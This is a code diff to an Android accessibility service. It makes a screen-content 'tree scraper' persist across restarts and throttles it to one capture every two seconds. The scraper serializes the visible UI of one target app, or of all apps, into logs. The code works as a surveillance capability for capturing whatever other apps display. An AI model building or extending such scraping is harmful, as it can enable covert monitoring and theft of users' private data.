@@ -56,15 +56,29 @@ class MyAccessibilityService : AccessibilityService() {
     }
 
     fun startTreeDump(pkg: String?, mins: Long) {
-        targetDumpPkg = if (pkg.isNullOrEmpty() || pkg == "null") null else pkg
-        treeDumpEndTime = System.currentTimeMillis() + (mins * 60 * 1000)
-        DebugLogger.log("TREE", "Scraper Started for $mins mins (Target: ${targetDumpPkg ?: "ALL"})")
+        val endTime = System.currentTimeMillis() + (mins * 60 * 1000)
+        val target = if (pkg.isNullOrEmpty() || pkg == "null") "" else pkg
+        
+        getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+            .putLong("tree_dump_end", endTime)
+            .putString("tree_dump_pkg", target)
+            .apply()
+            
+        targetDumpPkg = if (target.isEmpty()) null else target
+        treeDumpEndTime = endTime
+        DebugLogger.log("SCRAM", "Scraper Engaged: [${targetDumpPkg ?: "GLOBAL"}] for ${mins}m")
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
         val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
+        
+        // Restore Scraper Session
+        treeDumpEndTime = prefs.getLong("tree_dump_end", 0L)
+        val savedPkg = prefs.getString("tree_dump_pkg", "") ?: ""
+        targetDumpPkg = if (savedPkg.isEmpty()) null else savedPkg
+        
         val rulesStr = prefs.getString("cached_rules", "{}")
         cachedRules = try {
             val json = JSONObject(rulesStr)
@@ -96,19 +110,30 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- 1.5 TREE SCRAPER ENGINE ---
+        // --- 1.5 TREE SCRAPER ENGINE (Session-Based) ---
         if (now < treeDumpEndTime) {
-            if (targetDumpPkg == null || targetDumpPkg == pkgName) {
-                val root = rootInActiveWindow
-                if (root != null) {
-                    val treeJson = serializeNode(root)
-                    val wrapper = JSONObject()
-                    wrapper.put("pkg", pkgName)
-                    wrapper.put("ts", now)
-                    wrapper.put("tree", treeJson)
-                    DumpManager.appendLog("TREE", wrapper)
+            // Throttle: Only capture UI state every 2 seconds during a session to save resources
+            if (now - lastScreenRead > 2000) {
+                if (targetDumpPkg == null || targetDumpPkg == pkgName) {
+                    val root = rootInActiveWindow
+                    if (root != null) {
+                        val treeJson = serializeNode(root)
+                        val wrapper = JSONObject()
+                        wrapper.put("pkg", pkgName)
+                        wrapper.put("ts", now)
+                        wrapper.put("tree", treeJson)
+                        DumpManager.appendLog("TREE", wrapper)
+                        lastScreenRead = now // Update throttle
+                    }
                 }
             }
+        } else if (treeDumpEndTime != 0L) {
+             // Cleanup expired session
+             treeDumpEndTime = 0L
+             targetDumpPkg = null
+             getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
+                 .putLong("tree_dump_end", 0L).apply()
+             DebugLogger.log("SCRAM", "Scraper Session Expired and Cleaned")
         }
 
         // --- 2. STANDARD MONITORING ---
